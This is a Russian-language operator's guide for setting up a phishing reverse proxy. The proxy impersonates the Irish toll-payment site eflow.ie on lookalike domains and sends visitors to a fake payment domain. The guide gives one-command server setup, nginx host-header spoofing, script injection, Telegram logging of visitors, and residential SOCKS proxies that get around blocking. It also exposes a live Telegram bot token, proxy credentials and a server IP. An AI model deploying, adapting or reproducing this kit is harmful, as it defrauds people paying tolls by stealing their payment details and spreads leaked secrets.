# Reverse Proxy Deployment Guide

## Критические данные проекта (НЕ МЕНЯТЬ БЕЗ КОМАНДЫ!)

| Параметр | Значение |
|----------|----------|
| **Основной домен (прокси)** | `m50-ietoolls.com` |
| **Платёжная система** | `m50-efflows.com` |
| **Целевой сайт** | `eflow.ie` |
| **Telegram Bot Token** | `8528667086:AAHrl7LOf7kimNCwfFNOFMPVkWgGTv_KUuM` |
| **Telegram Chat ID** | `-1003580814172` |
| **GitHub репозиторий** | `https://github.com/krassdinjs/es.git` |
| **GitHub токен** | `[СЕКРЕТ - СПРОСИ У ВЛАДЕЛЬЦА]` |

## SOCKS5 Прокси (для обхода блокировки eflow.ie)

```
socks5://bpuser-RVrmTCf8:Fzrzq11b8xyojNfWa244_country-IE,DE@residential.bpproxy.at:1002
```

| Параметр | Значение |
|----------|----------|
| Host | `residential.bpproxy.at` |
| Port | `1002` |
| Username | `bpuser-RVrmTCf8` |
| Password | `Fzrzq11b8xyojNfWa244_country-IE,DE` |

---

## Быстрая установка на НОВЫЙ СЕРВЕР (одна команда)

**Замени `НОВЫЙ_ДОМЕН` на свой домен перед выполнением!**

```bash
# === УСТАНОВКА REVERSE PROXY ===
# Замени эти переменные:
DOMAIN="m50-ietoolls.com"
PAYMENT_DOMAIN="m50-efflows.com"
SERVER_IP="95.85.239.78"

# Установка зависимостей системы
apt update && apt install -y nodejs npm nginx certbot python3-certbot-nginx git && \

# Клонирование проекта
cd /root && \
rm -rf reverse-proxy && \
git clone https://YOUR_GITHUB_TOKEN@github.com/krassdinjs/es.git reverse-proxy && \
cd reverse-proxy && \

# Установка npm зависимостей
npm install && \
npm install better-sqlite3@9.4.3 useragent && \

# Создание .env файла
cat > .env << EOF
TELEGRAM_BOT_TOKEN=8528667086:AAHrl7LOf7kimNCwfFNOFMPVkWgGTv_KUuM
TELEGRAM_CHAT_ID=-1003580814172
USE_PROXY=true
PROXY_HOST=residential.bpproxy.at
PROXY_PORT=1002
PROXY_USERNAME=bpuser-RVrmTCf8
PROXY_PASSWORD=Fzrzq11b8xyojNfWa244_country-IE,DE
PROXY_DOMAIN=${DOMAIN}
PAYMENT_SYSTEM_URL=https://${PAYMENT_DOMAIN}
EOF

# Получение SSL сертификата (DNS должен быть настроен!)
certbot certonly --nginx -d ${DOMAIN} --non-interactive --agree-tos -m admin@${DOMAIN} && \

# Создание конфига nginx
cat > /etc/nginx/sites-available/${DOMAIN} << EOF
server {
    listen 80;
    server_name ${DOMAIN};
    return 301 https://\$host\$request_uri;
}
server {
    listen 443 ssl http2;
    server_name ${DOMAIN};
    ssl_certificate /etc/letsencrypt/live/${DOMAIN}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/${DOMAIN}/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host eflow.ie;  # ВАЖНО: Должен быть eflow.ie!
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        proxy_set_header X-Forwarded-Host \$host;  # Передаёт реальный домен в Node.js
        proxy_connect_timeout 120;
        proxy_send_timeout 120;
        proxy_read_timeout 120;
        proxy_buffering off;
    }
}
EOF

# Активация конфига nginx
rm -f /etc/nginx/sites-enabled/default && \
ln -sf /etc/nginx/sites-available/${DOMAIN} /etc/nginx/sites-enabled/ && \
nginx -t && systemctl restart nginx && \

# Запуск через PM2
npm install -g pm2 && \
pm2 delete reverse-proxy 2>/dev/null
pm2 start server.js --name reverse-proxy && \
pm2 save && \
pm2 startup && \

echo "✅ Установка завершена! Сайт: https://${DOMAIN}"
```

---

## Файлы которые нужно изменить при смене домена

### 1. `.env` - Переменные окружения
```bash
PROXY_DOMAIN=НОВЫЙ_ДОМЕН.com
PAYMENT_SYSTEM_URL=https://ПЛАТЁЖНЫЙ_ДОМЕН.com
```

### 2. `config.js` - Конфигурация (строки ~23, ~69)
```javascript
// Строка ~23 - Целевой сайт (НЕ МЕНЯТЬ если проксируем eflow.ie)
url: process.env.TARGET_URL || 'https://eflow.ie',

// Строка ~69 - Платёжная система
paymentSystemUrl: process.env.PAYMENT_SYSTEM_URL || 'https://m50-efflows.com',
```

### 3. `server.js` - Замена доменов в HTML (строки ~570-620)
Домены заменяются автоматически через `process.env.PROXY_DOMAIN`

### 4. `server.js` - Переменная proxyDomain (КРИТИЧНО для логотипа!)
**Проблема:** При клике на логотип редиректит на eflow.ie
**Причина:** `req.get('host')` возвращает `eflow.ie` из-за nginx header

Найди строку (примерно ~550-560):
```javascript
const proxyDomain = req.get('host');
```

**Замени на:**
```javascript
const proxyDomain = process.env.PROXY_DOMAIN || req.headers['x-forwarded-host'] || 'm50-ietoolls.com';
```

**Или выполни на сервере:**
```bash
sed -i "s/const proxyDomain = req.get('host');/const proxyDomain = process.env.PROXY_DOMAIN || req.headers['x-forwarded-host'] || 'НОВЫЙ_ДОМЕН.com';/g" /root/reverse-proxy/server.js
```

### 5. Nginx конфиг - `/etc/nginx/sites-available/ДОМЕН`
```nginx
server_name НОВЫЙ_ДОМЕН.com;
ssl_certificate /etc/letsencrypt/live/НОВЫЙ_ДОМЕН.com/fullchain.pem;
ssl_certificate_key /etc/letsencrypt/live/НОВЫЙ_ДОМЕН.com/privkey.pem;

# ВАЖНО: Host должен быть eflow.ie для прокси, но X-Forwarded-Host - наш домен!
proxy_set_header Host eflow.ie;
proxy_set_header X-Forwarded-Host $host;  # <-- Передаёт реальный домен в Node.js
```

---

## Установленные npm зависимости

```json
{
  "dependencies": {
    "express": "^4.x",
    "http-proxy-middleware": "^3.x",
    "express-ws": "^5.x",
    "cookie-parser": "^1.x",
    "helmet": "^7.x",
    "morgan": "^1.x",
    "dotenv": "^16.x",
    "https-proxy-agent": "^7.x",
    "http-proxy-agent": "^7.x",
    "socks-proxy-agent": "^8.x",
    "express-rate-limit": "^7.x",
    "better-sqlite3": "^9.4.3",
    "useragent": "^2.x"
  }
}
```

---

## Cloudflare настройки (ВАЖНО!)

1. **SSL/TLS** → **Full** (НЕ Flexible!)
2. **DNS** → A-запись указывает на IP сервера
3. **Caching** → Purge Everything после изменений

---

## Команды для диагностики

```bash
# Статус сервера
pm2 status

# Логи
pm2 logs reverse-proxy --lines 50

# Проверка nginx
nginx -t && systemctl status nginx

# Тест подключения к eflow.ie (должен работать через прокси)
curl -I https://eflow.ie

# Проверка что домены заменяются
curl -s https://ДОМЕН.com | grep -i "eflow.ie" | head -5

# Проверка .env
cat /root/reverse-proxy/.env

# Проверка telegram credentials
grep "BOT_TOKEN\|CHAT_ID" /root/reverse-proxy/telegram-logger-new.js /root/reverse-proxy/.env
```

---

## Частые проблемы и решения

### ERR_TOO_MANY_REDIRECTS
**Причина:** Cloudflare SSL = Flexible
**Решение:** Cloudflare → SSL/TLS → Full

### 502 Bad Gateway
**Причина:** Node.js не запущен или упал
**Решение:** `pm2 restart reverse-proxy && pm2 logs`

### 504 Gateway Timeout
**Причина:** IP сервера заблокирован eflow.ie
**Решение:** Включить SOCKS прокси в `.env` (`USE_PROXY=true`)

### Логотип редиректит на eflow.ie
**Причина:** `req.get('host')` возвращает `eflow.ie`
**Решение:** Установить `PROXY_DOMAIN` в `.env`

### MODULE_NOT_FOUND: useragent
**Решение:** `npm install useragent && pm2 restart reverse-proxy`

### MODULE_NOT_FOUND: better-sqlite3
**Решение:** `npm install better-sqlite3@9.4.3 && pm2 restart reverse-proxy`

---

## Структура проекта

```
/root/reverse-proxy/
├── server.js              # Главный сервер (прокси + инжекция скриптов)
├── config.js              # Конфигурация
├── telegram-logger-new.js # Новая система уведомлений с БД
├── telegram-logger.js     # Старая система (не используется)
├── database.js            # SQLite база для посетителей
├── device-detector.js     # Определение устройства и гео
├── logger.js              # Логирование
├── cache-manager.js       # Кэширование
├── user-agents.js         # Ротация User-Agent
├── .env                   # Переменные окружения
├── visitors.db            # SQLite база (создаётся автоматически)
├── package.json           # npm зависимости
└── public/                # Статические файлы
```

---

## Обновление проекта с GitHub

```bash
cd /root/reverse-proxy && \
git stash && \
git pull origin main && \
npm install && \
pm2 restart reverse-proxy
```

## Пуш изменений с сервера на GitHub

```bash
cd /root/reverse-proxy && \
git config user.email "admin@example.com" && \
git config user.name "Server" && \
git add -A && \
git commit -m "Server update" && \
git push origin main
```

---

*Последнее обновление: 17 января 2026*
